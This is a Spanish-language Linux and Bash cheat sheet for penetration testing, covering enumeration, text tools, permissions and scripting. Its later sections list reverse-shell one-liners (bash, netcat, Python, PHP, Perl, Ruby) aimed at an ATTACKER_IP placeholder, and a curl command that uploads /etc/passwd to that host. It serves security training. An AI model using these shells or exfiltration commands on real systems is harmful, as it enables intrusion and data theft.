# 🐧 Comandos de Linux y Bash - Guía completa de pentesting

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

---

## 📋 Índice

- [Navegación y archivos](#-navegación-y-archivos)
- [Enumeración del sistema](#-enumeración-del-sistema)
- [Enumeración de usuarios](#-enumeración-de-usuarios)
- [Comandos de red](#-comandos-de-red)
- [Búsqueda y análisis de archivos](#-búsqueda-y-análisis-de-archivos)
- [Procesamiento de texto](#-procesamiento-de-texto)
- [Permisos y propiedad](#-permisos-y-propiedad)
- [Gestión de procesos](#-gestión-de-procesos)
- [Gestión de paquetes](#-gestión-de-paquetes)
- [Scripting en Bash](#-scripting-en-bash)
- [Shells inversas](#-shells-inversas)
- [Transferencias de archivos](#-transferencias-de-archivos)
- [Comandos de una línea](#-comandos-de-una-línea)

---

## 📁 Navegación y archivos

### Navegación entre directorios

```bash
# Directorio actual
pwd

# Cambiar de directorio
cd /path/to/dir
cd ..          # Directorio padre
cd ~           # Directorio personal
cd -           # Directorio anterior

# Listar los archivos
ls
ls -la         # Formato largo, todos los archivos
ls -lah        # Tamaños legibles para las personas
ls -latr       # Ordenar por fecha, en orden inverso
ll             # Alias de ls -la (en muchas distribuciones)
```

### Operaciones con archivos

```bash
# Crear archivos o directorios
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # Crear los directorios padre

# Copiar
cp source dest
cp -r source_dir dest_dir  # Recursivo

# Mover o cambiar el nombre
mv source dest
mv oldname newname

# Eliminar
rm file
rm -r directory            # Recursivo
rm -rf directory           # Forzar, sin pedir confirmación

# Ver los archivos
cat file.txt
less file.txt              # Visor paginado
more file.txt
head -n 20 file.txt        # Primeras 20 líneas
tail -n 20 file.txt        # Últimas 20 líneas
tail -f file.txt           # Seguir los cambios en tiempo real
```

### Archivos y compresión

```bash
# tar
tar -cvf archive.tar files/      # Crear
tar -xvf archive.tar             # Extraer
tar -czvf archive.tar.gz files/  # Crear un archivo comprimido con gzip
tar -xzvf archive.tar.gz         # Extraer un archivo comprimido con gzip

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

## 🔍 Enumeración del sistema

### Información del sistema

```bash
# Nombre del host
hostname
hostname -I               # Direcciones IP

# Sistema operativo y kernel
uname -a                  # Toda la información
uname -r                  # Versión del kernel
cat /etc/os-release       # Información del sistema operativo
cat /etc/issue            # Banner del sistema operativo
cat /proc/version         # Información del kernel y del compilador

# Arquitectura
arch
uname -m

# Hardware
lscpu                     # Información de la CPU
cat /proc/cpuinfo
free -h                   # Memoria
df -h                     # Espacio en disco
lsblk                     # Dispositivos de bloques
```

### Entorno

```bash
# Variables de entorno
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Establecer una variable
export VAR="value"
VAR="value"
```

### Servicios en ejecución

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# Comprobar los puertos a la escucha
ss -tulpn
netstat -tulpn
```

### Tareas de cron

```bash
# Crontab del usuario
crontab -l

# Crontabs del sistema
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Observar tareas de cron (con pspy)
./pspy64
```

### Paquetes instalados

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# Buscar un paquete
dpkg -l | grep package
which binary
whereis binary
```

---

## 👤 Enumeración de usuarios

### Usuario actual

```bash
# Identificar al usuario actual
whoami
id
id username

# Grupos
groups
groups username

# Privilegios
sudo -l                   # Permisos de sudo
cat /etc/sudoers          # Archivo sudoers (requiere root)
```

### Todos los usuarios

```bash
# Lista de usuarios
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Usuarios con shell
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# Hashes de contraseñas (requiere root)
cat /etc/shadow

# Inicios de sesión recientes
last
lastlog
w
who
users
```

### Archivos de interés

```bash
# Claves SSH
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Historial
cat ~/.bash_history
cat ~/.zsh_history
history

# Archivos de configuración
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

## 🌐 Comandos de red

### Configuración de red

```bash
# Dirección IP
ip a
ip addr show
ifconfig

# Rutas
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# Tabla ARP
arp -a
ip neigh
```

### Puertos abiertos y conexiones

```bash
# Puertos a la escucha
ss -tulpn
ss -tlnp                  # Solo TCP
netstat -tulpn
netstat -ano

# Conexiones activas
ss -tup
netstat -an | grep ESTABLISHED

# Buscar un proceso por puerto
lsof -i :80
fuser 80/tcp
```

### Pruebas de red

```bash
# Ping
ping -c 4 host

# Traceroute
traceroute host
tracepath host

# Consulta DNS
host domain.com
dig domain.com
nslookup domain.com

# Comprobar un puerto
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # Solo las cabeceras
curl -s http://host       # Modo silencioso
curl -k https://host      # Omitir la verificación del certificado TLS
wget http://host/file
```

### Cortafuegos

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS)
firewall-cmd --list-all
```

---

## 🔎 Búsqueda y análisis de archivos

### Comando find

```bash
# Buscar por nombre
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # Sin distinguir mayúsculas y minúsculas

# Buscar por tipo
find / -type f -name "*.conf"          # Archivos
find / -type d -name "backup"          # Directorios

# Buscar por permisos
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # Con escritura para todos

# Buscar por propietario
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# Buscar por tamaño
find / -size +100M 2>/dev/null         # Más de 100 MB según el ejemplo
find / -size -1k 2>/dev/null           # Menos de 1 KB según el ejemplo

# Buscar por fecha
find / -mtime -7 2>/dev/null           # Modificado en los últimos 7 días
find / -atime +30 2>/dev/null          # Accedido hace más de 30 días

# Buscar y ejecutar
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

> **Matiz de `find -size`:** los sufijos `M` y `k` representan unidades binarias, con redondeo hacia arriba. Por ello `-size -1k` no significa simplemente «menos de 1024 bytes»: con ese redondeo selecciona archivos vacíos. Los comentarios originales sobre MB/KB son aproximados. Véase el [manual de GNU Findutils](https://www.gnu.org/software/findutils/manual/html_node/find_html/Size.html).

### Grep (búsqueda en archivos)

```bash
# Búsqueda básica
grep "pattern" file
grep -i "pattern" file                 # Sin distinguir mayúsculas y minúsculas
grep -r "pattern" /path/               # Recursivo
grep -rn "pattern" /path/              # Con números de línea

# Coincidencia inversa
grep -v "pattern" file                 # Líneas que NO coinciden

# Contar las líneas coincidentes
grep -c "pattern" file

# Mostrar el contexto
grep -A 3 "pattern" file               # 3 líneas después
grep -B 3 "pattern" file               # 3 líneas antes
grep -C 3 "pattern" file               # 3 líneas de contexto a cada lado

# Regex
grep -E "regex" file                   # Expresión regular extendida
egrep "regex" file

# Varios patrones
grep -E "pattern1|pattern2" file
```

### Locate y Which

```bash
# Locate (requiere updatedb)
locate filename
updatedb                               # Actualizar la base de datos

# Which (buscar un ejecutable)
which binary
whereis binary
type command
```

### Análisis de archivos

```bash
# Tipo de archivo
file filename

# Cadenas de texto de un binario
strings binary
strings binary | grep password

# Hexdump
xxd file
hexdump -C file

# Hash
md5sum file
sha256sum file
sha1sum file
```

---

<a id="-procesamiento-de-texto"></a>
## ✂️ Procesamiento de texto

### Cut

```bash
# Extraer campos por delimitador
cut -d: -f1 /etc/passwd                # Primer campo, delimitador :
cut -d: -f1,3 /etc/passwd              # Campos 1 y 3

# Extraer por posición de caracteres
cut -c1-10 file                        # Caracteres del 1 al 10
```

### Awk

```bash
# Mostrar columnas
awk '{print $1}' file                  # Primera columna
awk '{print $1, $3}' file              # Columnas 1 y 3
awk -F: '{print $1}' /etc/passwd       # Delimitador personalizado

# Condiciones
awk '$3 > 1000' /etc/passwd            # Cuando el campo 3 sea > 1000
awk '/pattern/ {print $1}' file        # Líneas coincidentes

# Variables integradas
awk '{print NR, $0}' file              # Números de línea
awk 'END {print NR}' file              # Total de líneas
```

> **Corrección del ejemplo de Awk:** la línea que compara `$3` en `/etc/passwd` conserva el original, pero necesita un separador de campos `:` para interpretar el UID como tercer campo. Awk separa por espacios en blanco de forma predeterminada; consulta el [manual de GNU Awk](https://www.gnu.org/software/gawk/manual/html_node/Field-Separators.html).

### Sed

```bash
# Sustituir
sed 's/old/new/' file                  # Primera coincidencia
sed 's/old/new/g' file                 # Todas las coincidencias
sed -i 's/old/new/g' file              # Modificar el archivo directamente

# Eliminar líneas
sed '/pattern/d' file                  # Eliminar las líneas coincidentes
sed '5d' file                          # Eliminar la línea 5
sed '1,5d' file                        # Eliminar las líneas de la 1 a la 5

# Mostrar líneas concretas
sed -n '5p' file                       # Mostrar la línea 5
sed -n '1,10p' file                    # Mostrar las líneas de la 1 a la 10
```

### Sort y Uniq

```bash
# Ordenar
sort file
sort -r file                           # Orden inverso
sort -n file                           # Numérico
sort -u file                           # Solo valores únicos
sort -t: -k3 -n /etc/passwd            # Por el campo 3

# Valores únicos
uniq file                              # Eliminar duplicados adyacentes
sort file | uniq                       # Eliminar todos los duplicados
uniq -c file                           # Contar las apariciones
sort file | uniq -c | sort -rn         # Contar y ordenar
```

### Otras utilidades

```bash
# Recuento de palabras
wc -l file                             # Líneas
wc -w file                             # Palabras
wc -c file                             # Bytes

# Formato de columnas
column -t file                         # Organizar en columnas
column -s: -t /etc/passwd              # Separador personalizado

# tr (transformar caracteres)
echo "HELLO" | tr 'A-Z' 'a-z'          # Minúsculas
cat file | tr -d '\n'                  # Eliminar saltos de línea

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

## 🔐 Permisos y propiedad

### Interpretación de los permisos

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Otros (r-x = 5)
│ │  └───── Grupo (r-x = 5)
│ └──────── Propietario (rwx = 7)
└────────── Tipo de archivo (- = archivo, d = directorio)
```

### Chmod

```bash
# Numérico
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# Simbólico
chmod +x file                          # Añadir permiso de ejecución
chmod -w file                          # Eliminar permiso de escritura
chmod u+x file                         # Ejecución para el propietario
chmod g+w file                         # Escritura para el grupo
chmod o-r file                         # Sin lectura para otros

# Recursivo
chmod -R 755 directory/
```

### Chown

```bash
# Cambiar el propietario
chown user file
chown user:group file
chown -R user:group directory/

# Cambiar solo el grupo
chgrp group file
```

### Permisos especiales

```bash
# SUID (Set User ID) - 4
chmod u+s file
chmod 4755 file

# SGID (Set Group ID) - 2
chmod g+s directory
chmod 2755 directory

# Sticky Bit - 1
chmod +t directory
chmod 1755 directory

# Buscar SUID/SGID
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

<a id="-gestión-de-procesos"></a>
## ⚙️ Gestión de procesos

### Ver los procesos

```bash
# Listar los procesos
ps aux
ps -ef
ps aux | grep process_name

# Top (en tiempo real)
top
htop                                   # Versión con más funciones

# Árbol de procesos
pstree
ps auxf
```

### Control de procesos

```bash
# Segundo plano y primer plano
command &                              # Ejecutar en segundo plano
Ctrl+Z                                 # Suspender
bg                                     # Reanudar en segundo plano
fg                                     # Traer a primer plano
jobs                                   # Listar los trabajos

# Finalizar un proceso
kill PID
kill -9 PID                            # Finalizar forzosamente
killall process_name
pkill process_name

# Nice (prioridad)
nice -n 10 command                     # Prioridad menor
renice 10 -p PID
```

---

## 📦 Gestión de paquetes

### Debian/Ubuntu (apt/dpkg)

```bash
# Actualizar
apt update
apt upgrade

# Instalar
apt install package
dpkg -i package.deb

# Eliminar
apt remove package
apt purge package                      # Eliminar junto con las configuraciones

# Buscar
apt search package
apt-cache search package

# Información
apt show package
dpkg -l | grep package
```

### RHEL/CentOS (yum/dnf)

```bash
# Actualizar
yum update
dnf update

# Instalar
yum install package
dnf install package

# Eliminar
yum remove package

# Buscar
yum search package

# Información
yum info package
rpm -qa | grep package
```

---

## 💻 Scripting en Bash

### Fundamentos

```bash
#!/bin/bash

# Variables
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# Sustitución de comandos
DATE=$(date)
FILES=`ls -la`

# Leer la entrada
read -p "Enter name: " NAME
echo "Hello $NAME"
```

### Condicionales

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# Comparaciones de cadenas
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # Vacía
if [ -n "$str" ]; then                 # No vacía

# Comparaciones de números
if [ $num1 -eq $num2 ]; then           # Igual
if [ $num1 -ne $num2 ]; then           # Distinto
if [ $num1 -gt $num2 ]; then           # Mayor que
if [ $num1 -lt $num2 ]; then           # Menor que

# Pruebas de archivos
if [ -e file ]; then                   # Existe
if [ -f file ]; then                   # Es un archivo
if [ -d dir ]; then                    # Es un directorio
if [ -r file ]; then                   # Se puede leer
if [ -w file ]; then                   # Se puede escribir
if [ -x file ]; then                   # Es ejecutable
```

> **Formato de los ejemplos:** las comparaciones y pruebas anteriores son fragmentos de sintaxis, no un script completo; cada bloque `if` requiere su cuerpo y su correspondiente `fi`.

### Bucles

```bash
# Bucle for
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# Bucle while
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# Bucle for de estilo C
for ((i=0; i<10; i++)); do
    echo $i
done
```

### Funciones

```bash
# Definir una función
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# Llamar a una función
function_name arg1 arg2
```

### Ejemplo de script

```bash
#!/bin/bash
# Escáner de puertos

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

## 🔌 Shells inversas

### Bash

```bash
# Bash con TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash con UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

> **Compatibilidad:** `ll` suele ser un alias del usuario o de la distribución; no es un comando garantizado. Las utilidades de red clásicas pueden no estar instaladas. Los ejemplos con `python` o Python 2 son históricos: verifica la versión disponible antes de reutilizarlos.

### Netcat

```bash
# nc con -e
nc -e /bin/bash ATTACKER_IP PORT

# nc sin -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

> **Compatibilidad de Netcat:** `-e` depende de la implementación y no significa ejecutar un programa en todas ellas. En OpenBSD nc, esa opción tiene un significado relacionado con certificados TLS; véase su [manual oficial](https://man.openbsd.org/nc).

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Mejorar la shell

```bash
# Crear una TTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# TTY completa
# En la shell inversa:
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# En el equipo atacante:
stty raw -echo; fg
# En la shell:
export TERM=xterm
stty rows 40 cols 150
```

---

<a id="-transferencias-de-archivos"></a>
## ⬇️ Transferencias de archivos

### Del atacante al objetivo

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# Atacante: nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64 (para archivos pequeños)
# Atacante: base64 file
echo "BASE64_STRING" | base64 -d > file
```

### Del objetivo al atacante

```bash
# nc
# Atacante: nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl (POST)
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# Copiar la salida al atacante y decodificarla
```

### Iniciar un servidor HTTP

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

## ⚡ Comandos de una línea

### Comandos de una línea útiles para pentesting

```bash
# Buscar binarios SUID
find / -perm -4000 -type f 2>/dev/null

# Buscar directorios con permiso de escritura
find / -writable -type d 2>/dev/null

# Buscar archivos con escritura para todos
find / -perm -o+w -type f 2>/dev/null

# Buscar archivos de configuración con contraseñas
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# Buscar claves SSH
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Escaneo rápido de puertos
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Barrido de hosts (ping sweep)
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# Extraer direcciones IP de un archivo
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Codificar y decodificar Base64
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# Codificar y decodificar URL
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

### Tabla de referencia rápida

| Finalidad | Comando |
|---------|---------|
| Usuario actual | `whoami` / `id` |
| Información del sistema | `uname -a` |
| Dirección IP | `ip a` / `hostname -I` |
| Puertos abiertos | `ss -tulpn` |
| Procesos en ejecución | `ps aux` |
| Buscar SUID | `find / -perm -4000 2>/dev/null` |
| Directorios con permiso de escritura | `find / -writable -type d 2>/dev/null` |
| Descargar un archivo | `wget http://url/file` |
| Shell inversa | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Mejorar la TTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

## 📚 Recursos

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Guía rápida de shells inversas](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Guías rápidas relacionadas
- [Escalada de privilegios en Linux](../../Linux-PrivEsc/translations/README.es.md)
- [Nmap](../../Nmap/translations/README.es.md)
- [Metasploit](../../Metasploit/translations/README.es.md)

---

<p align="center">
  <b>🐧 ¡Domina Linux para el pentesting!</b><br>
  <i>La línea de comandos es tu mejor aliada</i>
</p>
